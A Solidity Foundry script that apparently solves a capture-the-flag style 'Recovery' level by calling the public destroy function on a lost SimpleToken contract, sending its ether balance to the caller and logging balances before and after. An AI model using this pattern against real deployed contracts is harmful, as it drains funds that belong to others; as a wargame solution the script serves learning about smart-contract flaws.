// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {SimpleToken, Recovery} from "src/recovery/Recovery.sol";

contract RecoveryScript is Script {
    SimpleToken internal simpleToken;
    Recovery internal recovery;

    function setUp() public virtual {
        recovery = Recovery(0x702A171F2E759f453ea2745b750cc5baB4d1e817);
        simpleToken = SimpleToken(
            payable(0x8d73F19C339ca0433E2bDB1FFdb6903aA67c4d0d)
        );
    }

    function run() public virtual {
        vm.startBroadcast();
        console2.log(payable(address(simpleToken)).balance);
        console2.log(payable(address(msg.sender)).balance);
        simpleToken.destroy(payable(address(msg.sender)));
        console2.log(payable(address(simpleToken)).balance);
        console2.log(payable(address(msg.sender)).balance);

        vm.stopBroadcast();
    }
}
